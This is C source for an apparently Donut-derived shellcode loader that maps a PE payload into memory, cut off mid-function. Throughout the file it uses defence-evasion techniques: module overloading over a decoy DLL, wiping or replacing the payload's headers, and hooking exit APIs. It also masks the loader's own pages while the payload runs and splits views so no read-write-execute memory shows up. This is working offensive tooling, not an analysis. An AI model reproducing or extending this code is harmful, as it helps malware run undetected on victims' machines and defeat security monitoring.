/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#ifdef _WIN64
#define IMAGE_REL_TYPE IMAGE_REL_BASED_DIR64
#else
#define IMAGE_REL_TYPE IMAGE_REL_BASED_HIGHLOW
#endif

typedef struct _IMAGE_RELOC {
    WORD offset :12;
    WORD type   :4;
} IMAGE_RELOC, *PIMAGE_RELOC;

typedef BOOL  (WINAPI *DllMain_t)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
typedef VOID  (WINAPI *Start_t)(PPEB);
typedef VOID  (WINAPI *DllParam_t)(PVOID);
typedef VOID  (WINAPI *DllVoid_t)(VOID);

// for setting the command line...
typedef CHAR**  (WINAPI *p_acmdln_t)(VOID);
typedef WCHAR** (WINAPI *p_wcmdln_t)(VOID);

BOOL SetCommandLineW(PFRITTER_INSTANCE inst, PCWSTR NewCommandLine);
BOOL IsExitAPI(PFRITTER_INSTANCE inst, PCHAR name);
BOOL DonorTls(PFRITTER_INSTANCE inst, PIMAGE_TLS_DIRECTORY tls);
BOOL CheckForILOnly(PIMAGE_NT_HEADERS nthost, ULONG_PTR host);

// Apply the base relocations of the image mapped at cs. delta is the
// difference between the address it is mapped at and the address its
// contents are currently fixed up for. FALSE on a malformed table.
static BOOL ApplyRelocs(PVOID cs, DWORD rva, DWORD size, DWORD size_of_img, ULONG_PTR delta) {
    PIMAGE_BASE_RELOCATION ibr;
    PIMAGE_RELOC           list, end;
    PBYTE                  dir_end, address;
    DWORD                  target;

    if (delta == 0 || size == 0) return TRUE;
    if (rva >= size_of_img || size > size_of_img - rva) return FALSE;

    ibr     = RVA2VA(PIMAGE_BASE_RELOCATION, cs, rva);
    dir_end = (PBYTE)ibr + size;

    while ((PBYTE)ibr + sizeof(IMAGE_BASE_RELOCATION) <= dir_end && ibr->SizeOfBlock != 0) {
      if (ibr->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION) ||
          ibr->SizeOfBlock > (DWORD)(dir_end - (PBYTE)ibr)) return FALSE;

      list = (PIMAGE_RELOC)(ibr + 1);
      end  = (PIMAGE_RELOC)((PBYTE)ibr + (ibr->SizeOfBlock & ~1u));

      for (; list < end; list++) {
        if (list->type == IMAGE_REL_BASED_ABSOLUTE) continue;

        target = ibr->VirtualAddress + list->offset;
        // the patched value must lie inside the image
        if (target >= size_of_img || size_of_img - target < sizeof(ULONG_PTR)) continue;
        address = (PBYTE)cs + target;

        if (list->type == IMAGE_REL_BASED_DIR64) {
          *(PULONG_PTR)address += delta;
        } else if (list->type == IMAGE_REL_BASED_HIGHLOW) {
          *(PDWORD)address += (DWORD)delta;
        } else if (list->type == IMAGE_REL_BASED_HIGH) {
          *(PWORD)address += HIWORD((DWORD)delta);
        } else if (list->type == IMAGE_REL_BASED_LOW) {
          *(PWORD)address += LOWORD((DWORD)delta);
        } else {
          DPRINT("ERROR: Unrecognized Relocation type %08lx.", list->type);
          return FALSE;
        }
      }
      ibr = (PIMAGE_BASE_RELOCATION)((PBYTE)ibr + ibr->SizeOfBlock);
    }
    return TRUE;
}

// Change the protection of the shellcode's own pages. While PARK_CODE is in
// effect no protected loader function may be called: the dispatcher cannot
// decrypt on read-only pages.
VOID ParkLoader(PFRITTER_INSTANCE inst, DWORD mode) {
    ULONG_PTR lo, hi, mid, p;
    DWORD     old;

    if(inst->pic_base == 0 || inst->pic_len == 0) return;

    lo  = (ULONG_PTR)inst->pic_base;
    hi  = lo + inst->pic_len;
    // first page holding code that runs again (stack restore, shim, loader)
    mid = (lo + inst->pic_off + inst->len) & ~(ULONG_PTR)0xFFF;

    // A partial page at either end is only ours if the rest of it is empty;
    // otherwise it is shared with the host's own bytes and is left alone.
    if(lo & 0xFFF) {
      for(p = lo & ~(ULONG_PTR)0xFFF; p < lo && *(PBYTE)p == 0; p++);
      lo = (p == lo) ? (lo & ~(ULONG_PTR)0xFFF) : ((lo + 0xFFF) & ~(ULONG_PTR)0xFFF);
    }
    if(hi & 0xFFF) {
      for(p = hi; (p & 0xFFF) != 0 && *(PBYTE)p == 0; p++);
      hi = (p & 0xFFF) ? (hi & ~(ULONG_PTR)0xFFF) : p;
    }
    if(hi <= lo) return;
    if(mid < lo) mid = lo;
    if(mid > hi) mid = hi;

    if(mode == PARK_DATA) {
      if(mid > lo) inst->api.VirtualProtect((LPVOID)lo, mid - lo, PAGE_READWRITE, &old);
    } else if(hi > mid) {
      inst->api.VirtualProtect((LPVOID)mid, hi - mid,
        (mode == PARK_CODE) ? PAGE_EXECUTE_READ : PAGE_EXECUTE_READWRITE, &old);
    }
}

// State of the image being loaded, shared by the stages below.
// The mask stub page, when this output has one and sits where it was built
// for (page aligned).
PULONG64 MaskBase(PFRITTER_INSTANCE inst) {
    ULONG_PTR s;

    if(!inst->mask || inst->pic_base == 0 || inst->pic_len < 0x2000) return NULL;
    s = (ULONG_PTR)inst->pic_base + inst->pic_len - 0x1000;
    return (s & 0xFFF) ? NULL : (PULONG64)s;
}

PVOID MaskCall(PFRITTER_INSTANCE inst, PVOID fn) {
    PULONG64  s = MaskBase(inst);
    ULONG_PTR mid;

    if(s == NULL) return fn;
    // same boundary as ParkLoader: everything from the first page that runs again
    mid = ((ULONG_PTR)inst->pic_base + inst->pic_off + inst->len) & ~(ULONG_PTR)0xFFF;
    s[FRITTER_MASK_TARGET] = (ULONG_PTR)fn;
    s[FRITTER_MASK_VP]     = (ULONG_PTR)inst->api.VirtualProtect;
    s[FRITTER_MASK_PBASE]  = mid;
    s[FRITTER_MASK_PLEN]   = (ULONG_PTR)s - mid;
    // the decrypted instance, further up in the shellcode, is masked with the loader
    s[FRITTER_MASK_IBASE]  = (ULONG_PTR)inst;
    s[FRITTER_MASK_ICNT]   = (inst->len + 3) / 4;
    return (PBYTE)s + ((PWORD)s)[0];
}

PVOID MaskIn(PFRITTER_INSTANCE inst, PVOID fn) {
    PULONG64 s = MaskBase(inst);
    ULONG64  k;

    if(s == NULL) return fn;
    k = s[FRITTER_MASK_NIN];
    if(k >= FRITTER_MASK_NTGT) return NULL;   // more callbacks than thunks: fail at the call, not at random
    s[FRITTER_MASK_TGT + k] = (ULONG_PTR)fn;
    s[FRITTER_MASK_NIN]     = k + 1;
    return (PBYTE)s + ((PWORD)s)[2] + k * ((PWORD)s)[3];
}

typedef struct _PE_IMAGE {
    IMAGE_NT_HEADERS      ntc;         // copy of the payload's headers (the originals get wiped)
    PIMAGE_SECTION_HEADER shcp;        // copy of its section headers
    PVOID                 origmod;     // copy of the decoy's headers
    DWORD                 orig_hdr;    // and their size
    PVOID                 cs;          // base of the image
    PVOID                 wv;          // writable view for the last fix-ups
    HANDLE                hSection;
    SIZE_T                viewSize;
    DWORD                 lfanew;
    BOOL                  has_reloc;
    BOOL                  split;       // image mapped as one view per section
    BOOL                  hooked;      // an exit path of the payload was redirected
    ULONG_PTR             exit_fn;     // what the exit APIs are replaced with
    DWORD                 pcfh_slot;   // RVA of the IAT slot for RtlPcToFileHeader
    ULONG_PTR             pcfh_real;
    DWORD                 gpa_slot;    // same for GetProcAddress
    ULONG_PTR             gpa_real;
    DWORD                 term_slot;   // same for TerminateProcess
    ULONG_PTR             term_real;
    PVOID                 fn_table;    // registered unwind data of the image
    PVOID                 fn_table2;   // and of the GetProcAddress stub
} PE_IMAGE, *PPE_IMAGE;

// Stage 1: create the section, map a writable view of it and lay the image
// out there (headers, sections, relocations). With a decoy the section is
// an image mapping of the decoy file.
LOADER_FN_SECTION(".pe_map")
static BOOL PeMap(PFRITTER_INSTANCE inst, PFRITTER_MODULE mod, PPE_IMAGE pe) {
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt, ntnew;
    PIMAGE_SECTION_HEADER sh;
    LARGE_INTEGER         secsize;
    HANDLE                hDecoy;
    PVOID                 base, want, cs;
    SIZE_T                viewSize;
    NTSTATUS              status;
    DWORD                 i, cfg, oldprot;

    base = mod->data;
    dos  = (PIMAGE_DOS_HEADER)base;
    nt   = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);

    // the loader is x64 code: only an x64 image can be mapped
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
      DPRINT("File %08lx is not an x64 image...cannot load.", nt->FileHeader.Machine);
      return FALSE;
    }

    pe->ntc       = *nt;
    pe->lfanew    = dos->e_lfanew;
    pe->has_reloc = (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size != 0);

    // without relocation information the image only runs at its own base
    want = pe->has_reloc ? NULL : (PVOID)nt->OptionalHeader.ImageBase;
    secsize.QuadPart = nt->OptionalHeader.SizeOfImage;

    for (;;) {
      cs       = want;
      viewSize = 0;

      if (inst->decoy[0] == 0) {
        status = inst->api.NtCreateSection(&pe->hSection, SECTION_ALL_ACCESS, 0, &secsize,
                   PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
      } else {
        // module overloading: a MEM_IMAGE section backed by the decoy file
        DPRINT("Decoy file path: %s", inst->decoy);
        hDecoy = inst->api.CreateFileA(inst->decoy, GENERIC_READ, FILE_SHARE_READ, NULL,
                   OPEN_EXISTING, 0, NULL);

        if (hDecoy == INVALID_HANDLE_VALUE || hDecoy == 0) {
          DPRINT("Error opening decoy file: %d", inst->api.GetLastError());
          return FALSE;
        }
        status = inst->api.NtCreateSection(&pe->hSection, SECTION_ALL_ACCESS, 0, NULL,
                   PAGE_READONLY, SEC_IMAGE, hDecoy);
        inst->api.CloseHandle(hDecoy);
      }
      DPRINT("NtCreateSection: %d", status);
      if (status != 0) {
        pe->hSection = NULL;
        return FALSE;
      }

      status = inst->api.NtMapViewOfSection(pe->hSection, inst->api.GetCurrentProcess(), &cs,
                 0, 0, 0, &viewSize, ViewUnmap, 0, PAGE_READWRITE);
      DPRINT("NtMapViewOfSection: %d, %p, %lld", status, cs, viewSize);
      if ((status != 0 && status != 0x40000003) || cs == NULL) return FALSE;

      if (inst->decoy[0] == 0) break;

      // The payload has to fit inside the decoy's image (not its file:
      // the two sizes are unrelated).
      if (viewSize < nt->OptionalHeader.SizeOfImage) {
        DPRINT("Decoy image is smaller than the payload.");
        inst->api.NtUnmapViewOfSection(inst->api.GetCurrentProcess(), cs);
        inst->api.CloseHandle(pe->hSection);
        pe->hSection = NULL;
        return FALSE;
      }

      // A decoy built for Control Flow Guard brings its own table of
      // valid indirect-call targets, and the payload's functions are
      // not in it (only 16-byte aligned addresses can be added). Where
      // the host enforces the guard, the first system callback into the
      // payload - thread start, exit handler - would end the process.
      // Load without the decoy there.
      ntnew = RVA2VA(PIMAGE_NT_HEADERS, cs, ((PIMAGE_DOS_HEADER)cs)->e_lfanew);
      cfg   = 0;
      if (!((ntnew->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_GUARD_CF) &&
            inst->api.GetProcessMitigationPolicy != NULL &&
            inst->api.GetProcessMitigationPolicy(inst->api.GetCurrentProcess(), 7, &cfg, sizeof(cfg)) &&
            (cfg & 1))) break;

      DPRINT("Decoy cannot be used in a CFG process");
      inst->api.NtUnmapViewOfSection(inst->api.GetCurrentProcess(), cs);
      inst->api.CloseHandle(pe->hSection);
      pe->hSection   = NULL;
      inst->decoy[0] = 0;
    }
    pe->cs       = cs;
    pe->viewSize = viewSize;

    if (inst->decoy[0] != 0) {
      // Only the pages the payload occupies are taken over; the rest of the
      // decoy stays as the file has it, contents and protections.
      viewSize = pe->viewSize = (nt->OptionalHeader.SizeOfImage + 0xFFF) & ~(SIZE_T)0xFFF;

      // the views of an image mapping start out with the decoy's protections
      inst->api.VirtualProtect(cs, viewSize, PAGE_READWRITE, &oldprot);

      // keep the decoy's headers: they replace the payload's further down
      ntnew        = RVA2VA(PIMAGE_NT_HEADERS, cs, ((PIMAGE_DOS_HEADER)cs)->e_lfanew);
      pe->orig_hdr = ntnew->OptionalHeader.SizeOfHeaders;      // the decoy's, not the payload's
      if (pe->orig_hdr > viewSize) pe->orig_hdr = (DWORD)viewSize;

      pe->origmod = inst->api.VirtualAlloc(NULL, pe->orig_hdr,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

      if (pe->origmod != NULL)
        Memcpy(pe->origmod, cs, pe->orig_hdr);

      Memset(cs, 0, viewSize);
    }

    DPRINT("Copying %d bytes of headers", nt->OptionalHeader.SizeOfHeaders);
    Memcpy(cs, base, nt->OptionalHeader.SizeOfHeaders);

    ntnew = RVA2VA(PIMAGE_NT_HEADERS, cs, dos->e_lfanew);
    ntnew->OptionalHeader.ImageBase = (ULONGLONG)cs;

    sh = IMAGE_FIRST_SECTION(ntnew);

    for (i=0; i<ntnew->FileHeader.NumberOfSections; i++) {
      // the section must fit inside the view
      if (sh[i].VirtualAddress >= pe->ntc.OptionalHeader.SizeOfImage ||
          sh[i].SizeOfRawData  >  pe->ntc.OptionalHeader.SizeOfImage - sh[i].VirtualAddress) {
        DPRINT("Section lies outside the image.");
        return FALSE;
      }
      Memcpy((PBYTE)cs + sh[i].VirtualAddress, (PBYTE)base + sh[i].PointerToRawData, sh[i].SizeOfRawData);
      DPRINT("Copied section %s: 0x%X, 0x%lX bytes", sh[i].Name, sh[i].VirtualAddress, sh[i].SizeOfRawData);
    }

    // the section headers are needed after the image's own are wiped
    pe->shcp = inst->api.VirtualAlloc(NULL, pe->ntc.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER),
      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pe->shcp == NULL) return FALSE;

    Memcpy(pe->shcp, sh, pe->ntc.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));

    if (pe->has_reloc) {
      DPRINT("Applying Relocations");
      return ApplyRelocs(cs,
               pe->ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress,
               pe->ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size,
               pe->ntc.OptionalHeader.SizeOfImage,
               (ULONG_PTR)cs - (ULONG_PTR)pe->ntc.OptionalHeader.ImageBase);
    }
    return TRUE;
}

// Stage 2: resolve the imports of the image in the writable view.
LOADER_FN_SECTION(".pe_imp")
static BOOL PeImports(PFRITTER_INSTANCE inst, PFRITTER_MODULE mod, PPE_IMAGE pe) {
    PIMAGE_THUNK_DATA           oft, ft;
    PIMAGE_IMPORT_BY_NAME       ibn;
    PIMAGE_IMPORT_DESCRIPTOR    imp;
    PIMAGE_DELAYLOAD_DESCRIPTOR del;
    PVOID                       cs = pe->cs;
    PCHAR                       name;
    HMODULE                     dll;
    ULONG_PTR                   ptr;
    ULONG64                     h;
    DWORD                       rva;
    BOOL                        eh, ex;

    eh = (pe->ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size != 0);
    ex = (inst->exit_api[0] != 0);

    // An exit-related API must not end the host. On its own thread the
    // payload just ends that thread; otherwise the hook brings control
    // back to the loader so it can clean up and return.
    pe->exit_fn = (ULONG_PTR)inst->api.RtlExitUserThread;
    if (mod->thread == 0 && inst->hook != 0) {
      PULONG64 ms = MaskBase(inst);
      pe->exit_fn = (ULONG_PTR)((PULONG64)(ULONG_PTR)inst->hook)[0];
      if (ms != NULL) {
        // the hook is masked while the payload runs: go through the stub
        ms[FRITTER_MASK_HOOK]   = pe->exit_fn;
        ms[FRITTER_MASK_THREAD] = (ULONG_PTR)inst->api.RtlExitUserThread;
        ms[FRITTER_MASK_TID]    = 0;
        pe->exit_fn = (ULONG_PTR)ms + ((PWORD)ms)[1];
      }
    }

    rva = pe->ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

    if (rva != 0) {
      DPRINT("Processing the Import Table");

      imp = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, cs, rva);

      // For each DLL
      for (;imp->Name!=0; imp++) {
        name = RVA2VA(PCHAR, cs, imp->Name);

        dll = xGetLibAddress(inst, name);

        // a missing DLL would leave its IAT slots NULL: do not run the image
        if (dll == NULL) {
          DPRINT("Unable to load %s", name);
          return FALSE;
        }

        // Resolve the API for this library. Images bound without an
        // import name table only have the address table to walk.
        ft  = RVA2VA(PIMAGE_THUNK_DATA, cs, imp->FirstThunk);
        oft = (imp->OriginalFirstThunk != 0) ?
              RVA2VA(PIMAGE_THUNK_DATA, cs, imp->OriginalFirstThunk) : ft;

        // For each API
        for (;; oft++, ft++) {
          // No API left?
          if (oft->u1.AddressOfData == 0) break;

          // Resolve by ordinal?
          if (IMAGE_SNAP_BY_ORDINAL(oft->u1.Ordinal)) {
            ptr = (ULONG_PTR)xGetProcAddress(inst, dll, NULL, (DWORD)IMAGE_ORDINAL(oft->u1.Ordinal));
            if (ptr == 0) {
              DPRINT("Unable to resolve %s!#%i", name, (int)IMAGE_ORDINAL(oft->u1.Ordinal));
              return FALSE;
            }
            ft->u1.Function = ptr;
            continue;
          }
          // Resolve by name
          ibn = RVA2VA(PIMAGE_IMPORT_BY_NAME, cs, oft->u1.AddressOfData);

          if (ex && IsExitAPI(inst, ibn->Name)) {
            DPRINT("Replacing %s!%s", name, ibn->Name);
            ft->u1.Function = pe->exit_fn;
            pe->hooked      = TRUE;
            continue;
          }
          ptr = (ULONG_PTR)xGetProcAddress(inst, dll, ibn->Name, 0);
          if (ptr == 0) {
            DPRINT("Unable to resolve %s!%s", name, ibn->Name);
            return FALSE;
          }
          ft->u1.Function = ptr;

          // remember the slots that get a stub of their own (see PeViews)
          if (!eh && !ex) continue;
          h = maru(ibn->Name, inst->iv);

          if (eh && pe->pcfh_slot == 0 && h == inst->pcfh_hash) {
            pe->pcfh_slot = (DWORD)((PBYTE)&ft->u1.Function - (PBYTE)cs);
            pe->pcfh_real = ptr;
          } else if (ex && pe->gpa_slot == 0 && h == inst->gpa_hash) {
            pe->gpa_slot = (DWORD)((PBYTE)&ft->u1.Function - (PBYTE)cs);
            pe->gpa_real = ptr;
          } else if (ex && pe->term_slot == 0 && h == inst->term_hash) {
            pe->term_slot = (DWORD)((PBYTE)&ft->u1.Function - (PBYTE)cs);
            pe->term_real = ptr;
          }
        }
      }
    }

    rva = pe->ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress;

    if (rva != 0) {
      DPRINT("Processing Delayed Import Table");

      del = RVA2VA(PIMAGE_DELAYLOAD_DESCRIPTOR, cs, rva);

      // For each DLL
      for (;del->DllNameRVA != 0; del++) {
        name = RVA2VA(PCHAR, cs, del->DllNameRVA);

        dll = xGetLibAddress(inst, name);

        if (dll == NULL) continue;

        // Resolve the API for this library
        oft = RVA2VA(PIMAGE_THUNK_DATA, cs, del->ImportNameTableRVA);
        ft  = RVA2VA(PIMAGE_THUNK_DATA, cs, del->ImportAddressTableRVA);

        // For each API
        for (;; oft++, ft++) {
          // No API left?
          if (oft->u1.AddressOfData == 0) break;

          // Resolve by ordinal?
          if (IMAGE_SNAP_BY_ORDINAL(oft->u1.Ordinal)) {
            ft->u1.Function = (ULONG_PTR)xGetProcAddress(inst, dll, NULL, oft->u1.Ordinal);
          } else {
            // Resolve by name
            ibn = RVA2VA(PIMAGE_IMPORT_BY_NAME, cs, oft->u1.AddressOfData);
            if (ex && IsExitAPI(inst, ibn->Name)) {
              ft->u1.Function = pe->exit_fn;
              pe->hooked      = TRUE;
            } else {
              ft->u1.Function = (ULONG_PTR)xGetProcAddress(inst, dll, ibn->Name, 0);
            }
          }
        }
      }
    }
    return TRUE;
}

// Find `need` unused bytes after the end of an executable section and pick
// a position in them from `draw`. Returns the RVA, 0 if nothing fits.
static DWORD PeSlack(PPE_IMAGE pe, DWORD need, DWORD draw) {
    PIMAGE_SECTION_HEADER sh = pe->shcp;
    DWORD                 i, j, n, slack, limit;

    n = pe->ntc.FileHeader.NumberOfSections;

    for (i=0; i<n; i++) {
      if (!(sh[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;

      slack = sh[i].Misc.VirtualSize ? sh[i].Misc.VirtualSize : sh[i].SizeOfRawData;
      slack = sh[i].VirtualAddress + slack;                     // first free byte
      limit = (slack + 4095) & ~4095u;                          // end of that page
      if (limit > pe->ntc.OptionalHeader.SizeOfImage) limit = pe->ntc.OptionalHeader.SizeOfImage;
      // do not run into another section
      for (j=0; j<n; j++) {
        if (sh[j].VirtualAddress > sh[i].VirtualAddress &&
            sh[j].VirtualAddress < limit) limit = sh[j].VirtualAddress;
      }
      if (slack < limit && limit - slack >= need)
        return slack + draw % (limit - slack - need + 1);
    }
    return 0;
}

// Stage 3: finish the contents (headers, stubs), then give the image the
// views and page protections it runs with and register its unwind data.
LOADER_FN_SECTION(".pe_fin")
static BOOL PeViews(PFRITTER_INSTANCE inst, PFRITTER_MODULE mod, PPE_IMAGE pe) {
    PIMAGE_SECTION_HEADER shcp = pe->shcp;
    PVOID                 cs = pe->cs, first, ph, wv = NULL;
    HANDLE                proc = inst->api.GetCurrentProcess();
    SIZE_T                viewSize = pe->viewSize, vs, numBytes;
    NTSTATUS              status;
    DWORD                 i, k, rva, size, cnt, newprot, oldprot;
    DWORD                 n_eh, n_tp, n_gp, cur, tp_rva = 0;
    DWORD                 reloc_rva, reloc_size, size_of_img, hdr_size;
    PBYTE                 s;
    PDWORD                rf;
    BOOL                  split = FALSE;

    cnt         = pe->ntc.FileHeader.NumberOfSections;
    size_of_img = pe->ntc.OptionalHeader.SizeOfImage;
    hdr_size    = pe->ntc.OptionalHeader.SizeOfHeaders;
    reloc_rva   = pe->ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    reloc_size  = pe->ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

    if (inst->headers == 1) {
      if (inst->decoy[0] == 0) {
        DPRINT("Wiping Headers from memory");
        Memset(cs,        0, hdr_size);
        Memset(mod->data, 0, hdr_size);
      } else if (pe->origmod != NULL) {
        DPRINT("Overwriting PE headers with the decoy module's.");
        // all of them, as far as the payload's first section leaves room
        k = pe->orig_hdr;
        if (cnt != 0 && k > shcp[0].VirtualAddress) k = shcp[0].VirtualAddress;
        Memset(cs, 0, hdr_size);
        Memcpy(cs, pe->origmod, k);
      }
    }

    if (inst->decoy[0] == 0) {
      // drop the first view; the section keeps the contents
      first  = cs;
      status = inst->api.NtUnmapViewOfSection(proc, cs);
      DPRINT("NTSTATUS: %d", status);
      if (status != 0) return FALSE;
      pe->cs = cs = NULL;

      // Preferred: one view per section, each mapped with the protection
      // it ends up with, so that nothing reports read/write/execute as its
      // allocation protection. The range is reserved as a placeholder and
      // filled in below. Needs sections in ascending, page-aligned order.
      split = (inst->api.VirtualAlloc2 != NULL && inst->api.MapViewOfFile3 != NULL && cnt != 0);
      for (i=0; split && i<cnt; i++) {
        if ((shcp[i].VirtualAddress & 0xFFF) || shcp[i].VirtualAddress == 0 ||
            shcp[i].VirtualAddress >= viewSize ||
            (i != 0 && shcp[i].VirtualAddress <= shcp[i-1].VirtualAddress)) split = FALSE;
      }
      if (split) {
        split = FALSE;
        ph = inst->api.VirtualAlloc2(proc, first, viewSize,
               MEM_RESERVE | 0x00040000 /* placeholder */, PAGE_NOACCESS, NULL, 0);
        if (ph == NULL && pe->has_reloc)
          ph = inst->api.VirtualAlloc2(proc, NULL, viewSize,
                 MEM_RESERVE | 0x00040000, PAGE_NOACCESS, NULL, 0);

        if (ph != NULL) {
          vs = 0;
          if (inst->api.NtMapViewOfSection(pe->hSection, proc, &wv, 0, 0, 0,
                &vs, ViewUnmap, 0, PAGE_READWRITE) == 0) {
            split = TRUE;
            if (ph != first) {
              // the address was taken in the meantime: rebase by the distance moved
              split = ApplyRelocs(wv, reloc_rva, reloc_size, size_of_img, (ULONG_PTR)ph - (ULONG_PTR)first);
              if (split && inst->headers != 1)
                (RVA2VA(PIMAGE_NT_HEADERS, wv, pe->lfanew))->OptionalHeader.ImageBase = (ULONGLONG)ph;
            }
            if (!split) {
              inst->api.NtUnmapViewOfSection(proc, wv);
              wv = NULL;
            }
          }
          if (!split) inst->api.VirtualFree(ph, 0, MEM_RELEASE);
          else        cs = ph;
        }
      }

      if (!split) {
        // Fallback (older Windows): one view for the whole image.
        // The image is fixed up for the address of the first view, so ask
        // for that address again. The view is mapped read/write/execute
        // (not copy-on-write) so that every protection stays reachable:
        // a copy-on-write view refuses PAGE_READWRITE, which the MSVC
        // runtime requests on its own image during startup.
        cs       = first;
        viewSize = 0;
        status = inst->api.NtMapViewOfSection(pe->hSection, proc, &cs, 0, 0, 0, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
        DPRINT("Mapped at %p, NTSTATUS: %d", cs, status);

        if (status != 0 && pe->has_reloc) {
          // The address was taken in the meantime. Map wherever there is
          // room and rebase by the distance moved.
          cs       = NULL;
          viewSize = 0;
          status = inst->api.NtMapViewOfSection(pe->hSection, proc, &cs, 0, 0, 0, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
          DPRINT("Remapped at %p, NTSTATUS: %d", cs, status);

          if (status == 0) {
            if (!ApplyRelocs(cs, reloc_rva, reloc_size, size_of_img, (ULONG_PTR)cs - (ULONG_PTR)first)) {
              inst->api.NtUnmapViewOfSection(proc, cs);
              status = -1;
            } else if (inst->headers != 1) {
              // headers were kept: record the new base in them
              (RVA2VA(PIMAGE_NT_HEADERS, cs, pe->lfanew))->OptionalHeader.ImageBase = (ULONGLONG)cs;
            }
          }
        }
        if (status != 0) return FALSE;
      }
      pe->cs       = cs;
      pe->split    = split;
      pe->viewSize = viewSize;
    }
    if (wv == NULL) wv = cs;   // the view that runs is itself writable

    // Small generated stubs take the place of three imports. They go into
    // unused bytes after the end of an executable section, in an order and
    // at a position drawn by the generator.
    //  - RtlPcToFileHeader: a statically linked MSVC runtime asks it which
    //    image a thrown C++ type belongs to. Windows does not know this
    //    image, the answer is NULL and no catch block ever matches. The
    //    stub answers for this image and passes everything else on.
    //  - TerminateProcess: on the current process it becomes an exit.
    //  - GetProcAddress: hands out the replacements when the payload looks
    //    an exit function up by name. It calls the real function, so it
    //    comes with unwind data of its own.
    n_eh = (pe->pcfh_slot != 0) ? inst->eh_len : 0;
    n_gp = (pe->gpa_slot  != 0) ? inst->gp_len : 0;
    n_tp = (pe->term_slot != 0 || n_gp != 0) ? inst->tp_len : 0;

    cur = 0;
    if (n_eh + n_tp + n_gp != 0) {
      cur = PeSlack(pe, n_eh + n_tp + n_gp + 24, inst->eh_pos);
      if (cur == 0 && n_eh != 0) {
        // not enough room for all of them: the exception stub goes first
        n_tp = n_gp = 0;
        cur  = PeSlack(pe, n_eh, inst->eh_pos);
      }
    }
    for (i=0; cur != 0 && i<3; i++) {
      k = (i + (inst->eh_pos >> 24)) % 3;

      if (k == 0 && n_eh != 0) {
        s = (PBYTE)wv + cur;
        Memcpy(s, inst->eh_stub, n_eh);
        *(PULONG64)(s + inst->eh_base) = (ULONG64)(ULONG_PTR)cs ^ inst->eh_key[0];
        *(PDWORD)  (s + inst->eh_size) = size_of_img;
        *(PULONG64)(s + inst->eh_real) = (ULONG64)pe->pcfh_real ^ inst->eh_key[1];

        *(PULONG_PTR)((PBYTE)wv + pe->pcfh_slot) = (ULONG_PTR)cs + cur;
        cur += n_eh;
      } else if (k == 1 && n_tp != 0) {
        s = (PBYTE)wv + cur;
        Memcpy(s, inst->tp_stub, n_tp);
        *(PULONG64)(s + inst->tp_exit) = (ULONG64)pe->exit_fn;
        *(PULONG64)(s + inst->tp_real) = (ULONG64)(pe->term_slot != 0 ? pe->term_real :
                                                   (ULONG_PTR)inst->api.TerminateProcess);
        if (pe->term_slot != 0)
          *(PULONG_PTR)((PBYTE)wv + pe->term_slot) = (ULONG_PTR)cs + cur;
        tp_rva     = cur;
        pe->hooked = TRUE;
        cur += n_tp;
      } else if (k == 2 && n_gp != 0) {
        cur = (cur + 3) & ~3u;
        // unwind data: one stack allocation of gp_frame bytes in a 4-byte prolog
        s = (PBYTE)wv + cur;
        s[0] = 1; s[1] = 4; s[2] = 1; s[3] = 0;
        s[4] = 4; s[5] = (BYTE)((((inst->gp_frame - 8) / 8) << 4) | 2); s[6] = 0; s[7] = 0;
        rf    = (PDWORD)(s + 8);
